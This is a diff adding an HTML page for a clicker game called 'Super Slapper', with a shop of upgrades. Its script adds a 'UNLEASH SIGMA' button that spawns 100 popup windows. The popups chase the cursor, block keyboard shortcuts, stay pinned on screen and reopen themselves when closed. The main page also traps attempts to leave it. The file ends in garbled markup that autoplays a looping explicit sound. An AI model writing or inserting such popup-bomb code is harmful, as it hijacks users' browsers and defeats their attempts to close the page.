@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super Slapper Game</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
+            overflow-x: hidden;
+        }
+        .game-wrapper {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 1600px;
+            padding: 20px;
+            gap: 20px;
+            background-image: url('C:/Users/fghhn/Desktop/random/images/211832_backup.png');
+            background-size: cover;
+            background-position: center;
+        }
+        .gif-container {
+            flex: 0 0 300px;
+            height: 600px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        .sigma-gif {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 15px;
+        }
+        .video-container {
+            flex: 0 0 300px;
+            height: 600px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .video-overlay:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        .video-overlay button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: #e94560;
+            border: none;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .video-overlay button:hover {
+            transform: scale(1.1);
+        }
+        .video-controls {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            right: 10px;
+            display: flex;
+            gap: 10px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .video-container:hover .video-controls {
+            opacity: 1;
+        }
+        .video-controls button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .video-controls button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        .game-container {
+            flex: 1;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            max-width: 800px;
+            min-width: 320px;
+        }
+        .slap-target {
+            width: 300px;
+            height: 300px;
+            margin: 20px auto;
+            cursor: pointer;
+            transition: transform 0.1s, opacity 0.3s;
+            border-radius: 10px;
+            object-fit: cover;
+            background: white;
+            padding: 10px;
+            opacity: 0;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-user-drag: none;
+        }
+        .slap-target.slapping {
+            animation: slap-effect 0.1s ease-in-out;
+        }
+        @keyframes slap-effect {
+            0% { transform: scale(1); }
+            50% { transform: scale(0.95); }
+            100% { transform: scale(1); }
+        }
+        .slap-target.custom-cursor {
+            cursor: url('images/cursor.png'), auto;
+        }
+        .slap-target:active {
+            transform: scale(0.95);
+        }
+        .slap-target.error {
+            background: #FF6B6B;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            text-align: center;
+        }
+        .slap-number {
+            position: absolute;
+            font-size: 20px;
+            font-weight: bold;
+            pointer-events: none;
+            animation: float-up 1s ease-out;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        .critical {
+            position: absolute;
+            font-size: 24px;
+            font-weight: bold;
+            pointer-events: none;
+            animation: float-up 1s ease-out;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        @keyframes float-up {
+            0% { 
+                transform: translateY(0) scale(1); 
+                opacity: 1; 
+            }
+            50% {
+                transform: translateY(-25px) scale(1.2);
+                opacity: 0.8;
+            }
+            100% { 
+                transform: translateY(-50px) scale(1);
+                opacity: 0; 
+            }
+        }
+        .stats {
+            font-size: 20px;
+            margin: 20px;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .shop {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        .shop-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .shop-item {
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid transparent;
+        }
+        .shop-item:hover:not(.disabled) {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+            border-color: #e94560;
+        }
+        .shop-item h3 {
+            margin: 0 0 10px 0;
+            color: #e94560;
+        }
+        .disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .multiplier {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .sound-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .sound-toggle:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .sigma-button {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: #e94560;
+            border: none;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: transform 0.2s, background 0.3s;
+            z-index: 1000;
+        }
+        .sigma-button:hover {
+            transform: scale(1.05);
+            background: #ff4f6f;
+        }
+        .sigma-button img {
+            width: 24px;
+            height: 24px;
+        }
+        @media (max-width: 1200px) {
+            .game-wrapper {
+                flex-direction: column;
+            }
+            .gif-container {
+                flex: 0 0 200px;
+                width: 100%;
+                max-width: 800px;
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        let sigmaWindows = [];
+        let mouseX = 0;
+        let mouseY = 0;
+        
+        // Track mouse position
+        document.addEventListener('mousemove', (e) => {
+            mouseX = e.screenX;
+            mouseY = e.screenY;
+        });
+        
+        function createSigmaWindow(left, top) {
+            const width = 300;
+            const height = 200;
+            left = left || Math.random() * (window.screen.width - width);
+            top = top || Math.random() * (window.screen.height - height);
+            
+            const newWindow = window.open('about:blank', '_blank', `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,scrollbars=no`);
+            
+            if (newWindow) {
+                sigmaWindows.push(newWindow);
+                const htmlContent = 
+                    '<html>' +
+                    '<head>' +
+                    '<title>SIGMA MALE</title>' +
+                    '<style>' +
+                    'body { margin: 0; overflow: hidden; background: #1a1a2e; cursor: move; user-select: none; -webkit-user-select: none; }' +
+                    '.sigma-gif { width: 100%; height: 100vh; object-fit: cover; pointer-events: none; }' +
+                    '</style>' +
+                    '</head>' +
+                    '<body>' +
+                    '<img src="https://media.discordapp.net/attachments/1261159504469299212/1334442004569919488/convert.gif?ex=67cb58b6&is=67ca0736&hm=93ae0db20eef933e8e132c6a626f9b18ef5631a61ca5e41536d4aeaff4f75305&=" class="sigma-gif">' +
+                    '<script>' +
+                    'let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;' +
+                    'let isMoving = false;' +
+                    'let isMinimized = false;' +
+                    'document.body.onmousedown = dragMouseDown;' +
+                    
+                    // Follow mouse with slight delay
+                    'setInterval(() => {' +
+                    '    if (!isMoving) {' +
+                    '        const targetX = window.opener.mouseX - 150;' +  // Center window on cursor
+                    '        const targetY = window.opener.mouseY - 100;' +
+                    '        const currentX = window.screenX;' +
+                    '        const currentY = window.screenY;' +
+                    '        const dx = (targetX - currentX) * 0.1;' +  // Smooth movement
+                    '        const dy = (targetY - currentY) * 0.1;' +
+                    '        window.moveBy(dx, dy);' +
+                    '    }' +
+                    '}, 50);' +
+                    
+                    // Auto minimize/restore
+                    'setInterval(() => {' +
+                    '    isMinimized = !isMinimized;' +
+                    '    if (isMinimized) {' +
+                    '        window.blur();' +
+                    '    } else {' +
+                    '        window.focus();' +
+                    '    }' +
+                    '}, 3000);' +
+                    
+                    // Reopen if closed
+                    'window.onbeforeunload = function(e) {' +
+                    '    const x = window.screenX;' +
+                    '    const y = window.screenY;' +
+                    '    window.opener.createSigmaWindow(x, y);' +
+                    '    e.preventDefault();' +
+                    '    e.returnValue = "SIGMA NEVER DIES";' +
+                    '    return "SIGMA NEVER DIES";' +
+                    '};' +
+                    
+                    'function dragMouseDown(e) {' +
+                    '    isMoving = true;' +
+                    '    e = e || window.event;' +
+                    '    e.preventDefault();' +
+                    '    pos3 = e.clientX;' +
+                    '    pos4 = e.clientY;' +
+                    '    document.onmouseup = closeDragElement;' +
+                    '    document.onmousemove = elementDrag;' +
+                    '}' +
+                    
+                    'function elementDrag(e) {' +
+                    '    e = e || window.event;' +
+                    '    e.preventDefault();' +
+                    '    pos1 = pos3 - e.clientX;' +
+                    '    pos2 = pos4 - e.clientY;' +
+                    '    pos3 = e.clientX;' +
+                    '    pos4 = e.clientY;' +
+                    '    window.moveBy(-pos1, -pos2);' +
+                    '}' +
+                    
+                    'function closeDragElement() {' +
+                    '    isMoving = false;' +
+                    '    document.onmouseup = null;' +
+                    '    document.onmousemove = null;' +
+                    '}' +
+                    
+                    // Prevent keyboard shortcuts
+                    'document.onkeydown = function(e) {' +
+                    '    e = e || window.event;' +
+                    '    if (e.ctrlKey || e.altKey || e.metaKey) {' +
+                    '        e.preventDefault();' +
+                    '        return false;' +
+                    '    }' +
+                    '};' +
+                    
+                    // Keep window always visible
+                    'setInterval(() => {' +
+                    '    if (window.screenX < 0) window.moveTo(0, window.screenY);' +
+                    '    if (window.screenY < 0) window.moveTo(window.screenX, 0);' +
+                    '    if (window.screenX > window.screen.width - 300) window.moveTo(window.screen.width - 300, window.screenY);' +
+                    '    if (window.screenY > window.screen.height - 200) window.moveTo(window.screenX, window.screen.height - 200);' +
+                    '}, 100);' +
+                    
+                    '<\/script>' +
+                    '</body>' +
+                    '</html>';
+                newWindow.document.write(htmlContent);
+                newWindow.document.close();
+            }
+        }
+        
+        function openSigmaWindows() {
+            for (let i = 0; i < 100; i++) {
+                setTimeout(() => {
+                    createSigmaWindow();
+                }, i * 30);
+            }
+            return false;
+        }
+
+        // Make main window persistent too
+        window.onbeforeunload = function(e) {
+            e.preventDefault();
+            e.returnValue = "YOU CANNOT ESCAPE THE SIGMA REALM";
+            return "YOU CANNOT ESCAPE THE SIGMA REALM";
+        };
+    </script>
+    <a href="#" onclick="return openSigmaWindows()" class="sigma-button">
+        🐺 UNLEASH SIGMA
+    </a>
+    <button class="sound-toggle" id="sound-toggle">🔊 Sound: On</button>
+    <div class="game-wrapper">
+        <div class="gif-container" id="left-gif-container">
+            <img src="https://media.discordapp.net/attachments/1261159504469299212/1334442004569919488/convert.gif?ex=67cb58b6&is=67ca0736&hm=93ae0db20eef933e8e132c6a626f9b18ef5631a61ca5e41536d4aeaff4f75305&=" alt="Sigma GIF" class="sigma-gif">
+        </div>
+        <div class="game-container">
+            <h1>Super Slapper</h1>
+            <div class="stats">
+                <div>Slaps: <span id="slap-count">0</span></div>
+                <div>Slaps per second: <span id="slaps-per-second">0</span></div>
+                <div>Slap Power: <span id="slap-power">1</span>x</div>
+                <div>Critical Chance: <span id="crit-chance">0</span>%</div>
+            </div>
+            <img src="images/211832.png" class="slap-target" id="slap-target" alt="Slap Target">
+            <div class="shop">
+                <h2>Shop</h2>
+                <div class="shop-grid">
+                    <div class="shop-item" id="hand-upgrade">
+                        <h3>Custom Hand</h3>
+                        <p>Unlock special cursor</p>
+                        <p>Cost: <span id="hand-cost">50</span> slaps</p>
+                        <p>Status: <span id="hand-status">Locked</span></p>
+                    </div>
+                    <div class="shop-item" id="auto-slapper">
+                        <h3>Auto Slapper</h3>
+                        <p>+1 slap per second</p>
+                        <p>Cost: <span id="auto-slapper-cost">10</span> slaps</p>
+                        <p>You own: <span id="auto-slapper-count">0</span></p>
+                    </div>
+                    <div class="shop-item" id="power-upgrade">
+                        <h3>Slap Power</h3>
+                        <p>2x slap strength</p>
+                        <p>Cost: <span id="power-cost">100</span> slaps</p>
+                        <p>Level: <span id="power-level">0</span></p>
+                    </div>
+                    <div class="shop-item" id="mega-slapper">
+                        <h3>Mega Slapper</h3>
+                        <p>+5 slaps per second</p>
+                        <p>Cost: <span id="mega-slapper-cost">75</span> slaps</p>
+                        <p>You own: <span id="mega-slapper-count">0</span></p>
+                    </div>
+                    <div class="shop-item" id="crit-upgrade">
+                        <h3>Critical Slaps</h3>
+                        <p>Chance for 5x slaps</p>
+                        <p>Cost: <span id="crit-cost">150</span> slaps</p>
+                        <p>Chance: <span id="crit-level">0</span>%</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="gif-container" id="right-gif-container">
+            <img src="https://media.discordapp.net/attachments/1261159504469299212/1334442004569919488/convert.gif?ex=67cb58b6&is=67ca0736&hm=93ae0db20eef933e8e132c6a626f9b18ef5631a61ca5e41536d4aeaff4f75305&=" alt="Sigma GIF" class="sigma-gif">
+        </div>
+    </div>
+    <audio id="slap-sound" src="media/slap.mp3" preload="auto"></audio>
+    <script src="game.js"></script>
+</body>
+</html>^<audio
+autoplay
+loop
+src=\media/56863651_girl-moaning-6_by_a-sfx_preview.mp3\
+volume=\1.0\^>^>
